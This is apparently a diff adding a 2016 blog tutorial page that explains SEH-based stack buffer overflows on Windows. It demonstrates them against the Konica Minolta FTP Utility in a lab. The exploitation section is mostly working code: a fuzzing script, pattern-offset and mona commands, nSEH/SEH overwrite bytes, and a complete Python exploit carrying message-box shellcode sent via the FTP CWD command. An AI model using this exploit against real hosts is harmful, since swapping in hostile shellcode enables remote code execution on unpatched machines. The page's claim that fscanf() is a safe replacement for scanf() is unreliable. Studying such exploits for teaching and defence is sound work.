@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="I love low level stuff and today I put together my knowledge about special type of buffer overflow vulnerabilities called SEH chain corruption. SEH stands for Structured Exception Handler , it’s respo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwning with SEH based buffer overflows">
+<meta property="og:url" content="http://ketansingh.net/pwning-with-seh-based-buffer-overflows/index.html">
+<meta property="og:site_name" content="Ketansingh.net">
+<meta property="og:description" content="I love low level stuff and today I put together my knowledge about special type of buffer overflow vulnerabilities called SEH chain corruption. SEH stands for Structured Exception Handler , it’s respo">
+<meta property="og:image" content="https://i.imgur.com/mlZAPzM.png">
+<meta property="og:image" content="https://i.imgur.com/HJRAybc.jpg">
+<meta property="og:image" content="https://i.imgur.com/ImKEIRL.png">
+<meta property="og:image" content="https://i.imgur.com/kRtK2Kb.png">
+<meta property="og:image" content="https://i.imgur.com/wVUmsUG.png">
+<meta property="og:image" content="https://i.imgur.com/xBPfzxQ.png">
+<meta property="og:image" content="https://i.imgur.com/gxeUfrB.png">
+<meta property="og:image" content="https://i.imgur.com/CWDw0HR.png">
+<meta property="og:image" content="https://i.imgur.com/SmD7kz7.png">
+<meta property="og:image" content="https://i.imgur.com/zs12vvL.png">
+<meta property="og:updated_time" content="2016-06-04T03:49:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwning with SEH based buffer overflows">
+<meta name="twitter:description" content="I love low level stuff and today I put together my knowledge about special type of buffer overflow vulnerabilities called SEH chain corruption. SEH stands for Structured Exception Handler , it’s respo">
+<meta name="twitter:image" content="https://i.imgur.com/mlZAPzM.png">
+<meta name="twitter:creator" content="@http://twitter.com/sh_ketan">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Pwning with SEH based buffer overflows</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/analyzing-script-kiddies-tool-torshammer/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/file-utility-and-libmagic/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&text=Pwning with SEH based buffer overflows"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&is_video=false&description=Pwning with SEH based buffer overflows"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwning with SEH based buffer overflows&body=Check out this article: http://ketansingh.net/pwning-with-seh-based-buffer-overflows/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&name=Pwning with SEH based buffer overflows&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-Buffer-Overflow"><span class="toc-number">1.</span> <span class="toc-text">What is Buffer Overflow ?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SEH-Overflow"><span class="toc-number">2.</span> <span class="toc-text">SEH Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-SEH"><span class="toc-number">2.1.</span> <span class="toc-text">What is SEH?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-exploit-it"><span class="toc-number">2.2.</span> <span class="toc-text">How to exploit it ?</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Pwning with SEH based buffer overflows
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Ketansingh.net</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-02-07T07:01:26.000Z" itemprop="datePublished">2016-02-07</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/exploit/">exploit</a>, <a class="tag-link" href="/tags/overflow/">overflow</a>, <a class="tag-link" href="/tags/programming/">programming</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>I love low level stuff and today I put together my knowledge about special type of buffer overflow vulnerabilities called SEH chain corruption. SEH stands for Structured Exception Handler , it’s responsible for error handling in windows. Before I go  in depth about this , first I would like to discuss about what’s a buffer overflow for the uninitiated.</p>
+<h1 id="What-is-Buffer-Overflow"><a href="#What-is-Buffer-Overflow" class="headerlink" title="What is Buffer Overflow ?"></a>What is Buffer Overflow ?</h1><p>Buffer overflows occur when size of user input is not properly validated. It happens when more data into a buffer than it can handle. This often found programming error can be taken advantage to execute arbitrary code. What would a vulnerable code look like ?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(main)</span></span>&#123;</div><div class="line">...</div><div class="line">...</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,buf);</div><div class="line">...</div><div class="line">...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>scanf()</strong> does not checks size of input and buffer overflow is going to happen if someone tries to put string of length more than 10 into <strong>buf</strong> variable . This can potentially allow malicious user to execute some arbitrary code. Even in-built C function suffer from this weakness which should be clear from from above sample code.</p>
+<p>Following shows some common vulnerable function which should not be used , instead alternative which do bound checking should be used.</p>
+<p><strong>gets()</strong> -&gt; <strong>fgets()</strong> - To read characters.</p>
+<p><strong>strcpy()</strong> -&gt; <strong>strncpy()</strong> - To copy content of the buffer.</p>
+<p><strong>strcat()</strong> -&gt; <strong>strncat()</strong> - To buffer concatenation.</p>
+<p><strong>sprintf()</strong> -&gt; <strong>snprintf()</strong> - To fill buffer with data of different types.</p>
+<p><strong>scanf()</strong> -&gt; <strong>fscanf()</strong> - To read formatted input.</p>
+<p>Some functions do not have safer alternatives , those should be self implemented with proper bound checking. Some people might ask what exactly happens if we write larger data into small buffer ? Well , as name suggests it overflows into nearby memory and overflow can be controlled in such a way we can get control of IP (Instruction Pointer) and it be can directed to execute malicious code somewhere in memory. In some  cases control of Instruction Pointer is not possible so , only Denial Of Service(DoS) attack is only possible in those cases.</p>
+<p>Buffer Overflow are classified into</p>
+<p>Stack Overflow<br>Heap Overflow</p>
+<p>There are many sub-category of Stack and Heap overflow. Above stated code was stack overflow as variables are stored in stack memory. Similarly overflow can happen in dynamic memory too.</p>
+<h1 id="SEH-Overflow"><a href="#SEH-Overflow" class="headerlink" title="SEH Overflow"></a>SEH Overflow</h1><p>Coming back to star of this article , SEH overflows. This is actually a type of stack overflows where we overwrite SEH in stack area.</p>
+<h2 id="What-is-SEH"><a href="#What-is-SEH" class="headerlink" title="What is SEH?"></a>What is SEH?</h2><p>If you are familiar with programming , you probability might have used <strong>try</strong> and <strong>catch</strong> block in your code to catch exceptions generated by<br>some specific code and to deal with it if exceptions get caught.</p>
+<p>SEH is the native exception handling mechanism for Windows which was originally developed by Borelands and is licensed to Microsoft. SEH are structured in linked list data structure. It’s header pointer is maintained in TIB (Thread Information Block). In 32-bit systems <strong>FS</strong> register stores pointer on TIB.</p>
+<p><img src="https://i.imgur.com/mlZAPzM.png"></p>
+<p>If an exception can be handled , exception handler is called otherwise it’s passed to other handler by this linked list structure.</p>
+<p><img src="https://i.imgur.com/HJRAybc.jpg"><br>At the end there is default exception handler which kicks in if everything else fails to catch exception.<br>In order for the application to be able to go to the catch code, the pointer to the exception handler code is saved on the stack . This makes things interesting<br>as this address could potentially be overwritten allowing us to control EIP</p>
+<p>I am going to demonstrate exploitation by using <a href="https://www.exploit-db.com/apps/6388a2ae7dd2965225b3c8fad62f2b3b-ftpu_10.zip" target="_blank" rel="external">Konica Minolta FTP Utility</a> which has this vulnerability. Vulnerable program runs on windows 7 and attack payload is sent using Linux machine. Immunity debugger was to debug. To test if this program is vulnerable to overflow , I sent ridiculously long string to remote FTP server, using this python script.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">buf = <span class="string">'CWD '</span></div><div class="line">buf += <span class="string">"A"</span>*<span class="number">5000</span></div><div class="line"></div><div class="line">s.connect((<span class="string">'192.168.56.102'</span>,<span class="number">21</span>))</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line">s.send(<span class="string">'USER anonymous'</span>)</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line">s.send(<span class="string">'PASS anonymous'</span>)</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line"></div><div class="line">s.send(buf)</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line"></div><div class="line">s.close</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/ImKEIRL.png"><br>Interestingly , we were able to cause an exception.<br>Let’s try to pass this exception using SHIFT+F7</p>
+<p>and voila</p>
+<p><img src="https://i.imgur.com/kRtK2Kb.png"></p>
+<p>SEH chain is corrupted and EIP tried to execute code at [41414141] which is hexcode for “A” and got access violation because that’s a valid memory address.<br>Note that our ‘shellcode’ (which is just “A” here) is located after nSEH (Next SEH ) and SEH Handler. Shellcode is our ‘malicious’ code which which we wanna execute.</p>
+<p><img src="https://i.imgur.com/wVUmsUG.png"></p>
+<h2 id="How-to-exploit-it"><a href="#How-to-exploit-it" class="headerlink" title="How to exploit it ?"></a>How to exploit it ?</h2><p>SEH exploits are based on the fact that the attacker can alter a portion of the stack and manipulate it to direct the execution of the SEH handler after an exception is raised. After an exception, execution begins at the address that is pointed by the first SEH handler in stack. So the attacker could alter the SEH handler and begin execution of shellcode. Assuming , there is no DEP and SafeSEH enabled this is the general overview of this technique</p>
+<p>Now we need to find out after how many bytes we write SEH , We’ll use Metasploit’s pattern generator to do this. To generate we’ll use use <em>pattern_create.rb</em> (in metasploit-framework/tools/)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pattern_generate.rb 5000 &gt; ~/pattern.txt</div></pre></td></tr></table></figure>
+<p>and send this pattern in ‘buf’ variable in our python script</p>
+<p><img src="https://i.imgur.com/xBPfzxQ.png"><br>Now after we get exception we fire up <a href="https://github.com/corelan/mona" target="_blank" rel="external">mona.py</a> in Immunity to find location after which we can write SEH chain using </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona findmsp</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/gxeUfrB.png"><br>Nice so after 1037 bytes we reach our SEH chain and can overwrite address.</p>
+<p>Last piece of puzzle is how exactly to do it. One little detail I left out is that when an exception is raised, the memory looks like this:</p>
+<p><img src="https://i.imgur.com/CWDw0HR.png"></p>
+<p>Because when system tries to handle the exception that is raised, it sets up the <strong>EXCEPTION_DISPOSITION</strong> Handler structure on the stack. </p>
+<p>Now we need to get to our shellcode . First step would be to return to our SEH chain for this reason we need to execute <strong>POP POP RETN</strong> instruction which will get us back to <em>nSEH</em> (Next SEH) . Two <strong>POP</strong> will pop top of stack and <strong>RETN</strong> will put whatever is on top of stack to <strong>EIP</strong> (Instruction Pointer register)</p>
+<p>I used mona.py Immunity script to find location of <strong>POP POP RETN</strong> in any loaded DLL which have no ASLR and no SafeSEH.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona seh</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/SmD7kz7.png"><br>I can use any of this address to execute POP POP RETN </p>
+<p>After returning to nSEH I need to jump to shellcode which is 8 bytes away from nSEH , So overwriting nSEH with instruction , just to be safe I am going jump 12 bytes ahead </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NOP</div><div class="line">NOP</div><div class="line">JMP SHORT &lt;12 bytes ahead&gt;</div></pre></td></tr></table></figure>
+<p>note that NOP instruction is does nothing and it’s op code is “90” and is generally used as ‘filler’ op code for this instruction will be <strong>“\xEB\x0A\x90\x90”</strong> (It’s in reverse order to take account for Little Endianess in x86 ). We will write nSEH with this address and handler with any of pointer to <strong>POP POP RETN</strong> found using mona.py</p>
+<p>Quick Recap:</p>
+<p>We can modify SEH chain which consists of <strong>NEXT SEH</strong> and <strong>SEH HANDLER</strong>. We are writing <strong>NEXT SEH</strong> with instruction to jump 12 bytes ahead and <strong>SEH HANDLER</strong> with pointer to <strong>POP POP RETN</strong> instruction to get back to <strong>NEXT SEH</strong> and from it to our shellcode.</p>
+<p>For the shellcode , I used this alert message shellcode <a href="http://shell-storm.org/shellcode/files/shellcode-648.php" target="_blank" rel="external">http://shell-storm.org/shellcode/files/shellcode-648.php</a></p>
+<p>our final exploit looks like</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf +=     <span class="string">"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"</span></div><div class="line">buf +=     <span class="string">"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"</span></div><div class="line">buf +=     <span class="string">"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"</span></div><div class="line">buf +=     <span class="string">"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"</span></div><div class="line">buf +=     <span class="string">"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"</span></div><div class="line">buf +=     <span class="string">"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"</span></div><div class="line">buf +=     <span class="string">"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"</span></div><div class="line">buf +=     <span class="string">"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"</span></div><div class="line">buf +=     <span class="string">"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"</span></div><div class="line">buf +=     <span class="string">"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"</span></div><div class="line">buf +=     <span class="string">"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"</span></div><div class="line">buf +=     <span class="string">"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"</span></div><div class="line">buf +=     <span class="string">"\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"</span></div><div class="line">buf +=     <span class="string">"\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"</span></div><div class="line">buf +=     <span class="string">"\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"</span></div><div class="line">buf +=     <span class="string">"\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"</span></div><div class="line">buf +=     <span class="string">"\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"</span></div><div class="line">buf +=     <span class="string">"\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"</span></div><div class="line">buf +=     <span class="string">"\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"</span></div><div class="line">buf +=     <span class="string">"\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"</span></div><div class="line">buf +=     <span class="string">"\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"</span></div><div class="line">buf +=     <span class="string">"\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"</span></div><div class="line">buf +=     <span class="string">"\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"</span></div><div class="line">buf +=     <span class="string">"\x40\xFF\x54\x24\x40\x57\xFF\xD0"</span></div><div class="line"></div><div class="line">nSEH = <span class="string">"\xeb\x0a\x90\x90"</span></div><div class="line">SEH = <span class="string">"\x5D\x32\x20\x12"</span></div><div class="line">buffer = <span class="string">"CWD "</span>+<span class="string">"\x41"</span> * <span class="number">1037</span> + nSEH + SEH  + <span class="string">"\x90"</span> *<span class="number">20</span> +  buf + <span class="string">"\x90"</span>*<span class="number">200</span></div><div class="line"><span class="keyword">print</span> len(buffer)</div><div class="line"><span class="keyword">print</span> len(buf)</div><div class="line">s.connect((<span class="string">'192.168.56.102'</span>,<span class="number">21</span>))</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line">s.send(<span class="string">'USER anonymous'</span>)</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line">s.send(<span class="string">'PASS anonymous'</span>)</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line"></div><div class="line">s.send(buffer)</div><div class="line">print(s.recv(<span class="number">1024</span>))</div><div class="line"></div><div class="line">s.close</div></pre></td></tr></table></figure>
+<p>Running this gives us</p>
+<p><img src="https://i.imgur.com/zs12vvL.png"></p>
+<p>Game Over :D</p>
+<p>Thanks to : corelanc0d3r , Vivek Ramachandran and TOMIWA (for original exploit)</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-Buffer-Overflow"><span class="toc-number">1.</span> <span class="toc-text">What is Buffer Overflow ?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SEH-Overflow"><span class="toc-number">2.</span> <span class="toc-text">SEH Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-SEH"><span class="toc-number">2.1.</span> <span class="toc-text">What is SEH?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-exploit-it"><span class="toc-number">2.2.</span> <span class="toc-text">How to exploit it ?</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&text=Pwning with SEH based buffer overflows"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&is_video=false&description=Pwning with SEH based buffer overflows"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwning with SEH based buffer overflows&body=Check out this article: http://ketansingh.net/pwning-with-seh-based-buffer-overflows/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&title=Pwning with SEH based buffer overflows"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ketansingh.net/pwning-with-seh-based-buffer-overflows/&name=Pwning with SEH based buffer overflows&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 Ketan Singh
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-47868439-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
